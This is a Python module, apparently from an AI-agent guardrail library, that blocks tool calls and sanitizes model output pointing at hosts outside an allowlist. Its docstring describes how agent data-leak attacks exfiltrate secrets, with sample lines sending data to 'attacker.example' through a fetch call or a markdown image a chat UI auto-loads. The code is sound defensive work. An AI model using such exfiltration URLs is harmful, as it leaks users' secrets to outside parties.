"""Egress control: which hosts may untrusted text point at?

The exfiltration step of nearly every agent data-leak attack is a URL:
`fetch_url("https://attacker.example/?d=<secret>")`, an email to an
outside address, or a markdown image `![](https://attacker.example/p.png?d=...)`
in model output that a chat UI renders (and so fetches) automatically.
`EgressAllowlist` names the hosts that are fine; anything else found in a
tool's arguments or a model's output is flagged, and `EgressPolicy` denies
the tool call before it runs.

Allowlist, never blocklist, and parse conservatively. URL parsers
disagree with each other (Python's `urllib.parse` is not the WHATWG URL
standard browsers and HTTP clients follow — CVE-2023-24329, CVE-2024-11168,
CVE-2025-0938 were all allowlist/blocklist bypasses), so any URL this
module can't parse unambiguously counts as *disallowed*: userinfo (`@`),
backslashes, control or whitespace characters, or a host that doesn't
survive IDNA encoding. Hosts are compared after IDNA (punycode) encoding,
lowercasing, and stripping a trailing dot, so a Unicode look-alike of an
allowed host never matches it — it encodes to a different `xn--` name.

Audit entries record the offending *host* only, never the full URL: the
path and query string are exactly where an exfiltration attempt puts the
data it's trying to steal.
"""

from __future__ import annotations

import ipaddress
import re
import time
from dataclasses import asdict, dataclass, field
from typing import Any, Iterable, Literal, Optional
from urllib.parse import urlsplit

from marshal_ai.audit import AuditSink, register_entry_type
from marshal_ai.policy import Principal
from marshal_ai.tools import ToolCallRequest, ToolDecision, ToolPolicy

# Possessive quantifiers (Python 3.11+) so a long adversarial string can't
# make either pattern backtrack: each run of characters is consumed once.
_SCHEME_URL = re.compile(r"(?i)\b(?:https?|wss?|ftp)://[^\s<>\"'`)\]]++")
_BARE_URL = re.compile(r"(?i)(?<![@\w.-])(?:[a-z0-9-]++\.)++[a-z]{2,63}+(?::\d{1,5}+)?+/[^\s<>\"'`)\]]*+")
_TRAILING_PUNCTUATION = ".,;:!?"
_UNSAFE_CHARS = re.compile(r"[\\\x00-\x20\x7f-\x9f]")

# Sentinel "host" for a URL that couldn't be parsed unambiguously.
UNPARSEABLE = "<unparseable>"


def _normalize_host(host: str) -> Optional[str]:
    host = host.strip().rstrip(".").lower()
    if not host:
        return None
    try:
        ipaddress.ip_address(host.strip("[]"))
        return host.strip("[]")
    except ValueError:
        pass
    try:
        return host.encode("idna").decode("ascii")
    except UnicodeError:
        return None


def host_of(url: str) -> str:
    """The normalized host a URL points at, or `UNPARSEABLE`."""
    if _UNSAFE_CHARS.search(url):
        return UNPARSEABLE
    if "://" not in url:
        url = "http://" + url
    try:
        parts = urlsplit(url)
        hostname = parts.hostname
        port = parts.port  # raises ValueError on a malformed port
    except ValueError:
        return UNPARSEABLE
    del port
    if not hostname or "@" in parts.netloc:
        return UNPARSEABLE
    normalized = _normalize_host(hostname)
    return normalized if normalized is not None else UNPARSEABLE


@dataclass(frozen=True)
class EgressFinding:
    host: str
    count: int


class EgressAllowlist:
    """Hosts that untrusted text may point at. An entry is either an exact
    host (`"api.github.com"`) or `"*.example.com"`, which matches any
    subdomain of example.com but not example.com itself (list both if you
    want both). IP addresses only match when listed exactly.

    `match_bare_domains` — also treat scheme-less `host.tld/path` strings
    as URLs (many tools prepend `https://` themselves). Default True.
    """

    def __init__(self, hosts: Iterable[str], match_bare_domains: bool = True) -> None:
        self._exact: set[str] = set()
        self._suffixes: set[str] = set()
        for entry in hosts:
            if entry.startswith("*."):
                normalized = _normalize_host(entry[2:])
                if normalized is None:
                    raise ValueError(f"invalid allowlist entry {entry!r}")
                self._suffixes.add(normalized)
            else:
                normalized = _normalize_host(entry)
                if normalized is None:
                    raise ValueError(f"invalid allowlist entry {entry!r}")
                self._exact.add(normalized)
        self._match_bare_domains = match_bare_domains

    def is_allowed(self, host: str) -> bool:
        if host == UNPARSEABLE:
            return False
        if host in self._exact:
            return True
        return any(host.endswith("." + suffix) for suffix in self._suffixes)

    def find_urls(self, text: str) -> list[str]:
        if not text:
            return []
        urls = [m.group(0).rstrip(_TRAILING_PUNCTUATION) for m in _SCHEME_URL.finditer(text)]
        if self._match_bare_domains:
            scheme_spans = [m.span() for m in _SCHEME_URL.finditer(text)]
            for m in _BARE_URL.finditer(text):
                if not any(start <= m.start() < end for start, end in scheme_spans):
                    urls.append(m.group(0).rstrip(_TRAILING_PUNCTUATION))
        return urls

    def check(self, text: str) -> list[EgressFinding]:
        """Hosts in `text` that aren't allowed, with how often each appears."""
        counts: dict[str, int] = {}
        for url in self.find_urls(text):
            host = host_of(url)
            if not self.is_allowed(host):
                counts[host] = counts.get(host, 0) + 1
        return [EgressFinding(host, n) for host, n in sorted(counts.items())]

    def sanitize(self, text: str, replacement: str = "[BLOCKED_URL]") -> tuple[str, list[EgressFinding]]:
        """Replace every disallowed URL in `text` — e.g. model output, before
        a UI renders it, so a markdown image can't phone home."""
        findings = self.check(text)
        if not findings:
            return text, []
        for url in sorted(set(self.find_urls(text)), key=len, reverse=True):
            if not self.is_allowed(host_of(url)):
                text = text.replace(url, replacement)
        return text, findings


def _strings_in(value: Any, depth: int = 0) -> Iterable[str]:
    # Bounded recursion: a deeply nested argument can't blow the stack;
    # anything deeper than this is scanned as its repr.
    if depth > 32:
        yield repr(value)
        return
    if isinstance(value, str):
        yield value
    elif isinstance(value, dict):
        for key, item in value.items():
            if isinstance(key, str):
                yield key
            yield from _strings_in(item, depth + 1)
    elif isinstance(value, (list, tuple, set, frozenset)):
        for item in value:
            yield from _strings_in(item, depth + 1)


@dataclass(frozen=True)
class EgressEntry:
    """A disallowed destination found in a tool call's arguments or a
    model's output. `hosts` is `["host:count", ...]` — never the URL."""

    timestamp: float
    principal_id: str
    surface: str  # "tool_call" | "model_completion"
    location: str  # tool name / model name
    hosts: list[str]
    action: str  # "blocked" | "audited_only"
    on_behalf_of: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {"kind": "egress", **asdict(self)}


register_entry_type("egress", EgressEntry)


def write_egress_finding(
    audit_sink: Optional[AuditSink],
    principal: Principal,
    surface: str,
    location: str,
    findings: list[EgressFinding],
    action: str,
) -> None:
    if audit_sink is None or not findings:
        return
    audit_sink.write(
        EgressEntry(
            timestamp=time.time(),
            principal_id=principal.id,
            surface=surface,
            location=location,
            hosts=[f"{f.host}:{f.count}" for f in findings],
            action=action,
            on_behalf_of=principal.delegation_chain,
        )
    )


class EgressPolicy(ToolPolicy):
    """Wraps a `ToolPolicy`; a call whose arguments (at any nesting depth,
    keys included) mention a host outside `allowlist` is escalated to
    `on_violation` — `"deny"` (the default) or `"require_approval"`.
    Monotonic: never loosens the base decision. Pass the guard's
    `audit_sink` to record which hosts were refused."""

    def __init__(
        self,
        base: ToolPolicy,
        allowlist: EgressAllowlist,
        on_violation: Literal["deny", "require_approval"] = "deny",
        audit_sink: Optional[AuditSink] = None,
    ) -> None:
        if on_violation not in ("deny", "require_approval"):
            raise ValueError("on_violation must be 'deny' or 'require_approval'")
        self._base = base
        self._allowlist = allowlist
        self._on_violation = on_violation
        self._audit_sink = audit_sink

    def evaluate(self, request: ToolCallRequest) -> ToolDecision:
        decision = self._base.evaluate(request)
        if decision.outcome == "deny":
            return decision
        counts: dict[str, int] = {}
        for text in _strings_in(request.arguments):
            for finding in self._allowlist.check(text):
                counts[finding.host] = counts.get(finding.host, 0) + finding.count
        if not counts:
            return decision
        findings = [EgressFinding(host, n) for host, n in sorted(counts.items())]
        action = "blocked" if self._on_violation == "deny" else "audited_only"
        write_egress_finding(self._audit_sink, request.principal, "tool_call", request.tool_name, findings, action)
        if decision.outcome == "require_approval" and self._on_violation == "require_approval":
            return decision
        return ToolDecision(
            self._on_violation,
            f"egress to non-allowlisted host(s): {', '.join(f.host for f in findings)}",
        )

    def redact_arguments(self, request: ToolCallRequest) -> dict[str, Any]:
        return self._base.redact_arguments(request)
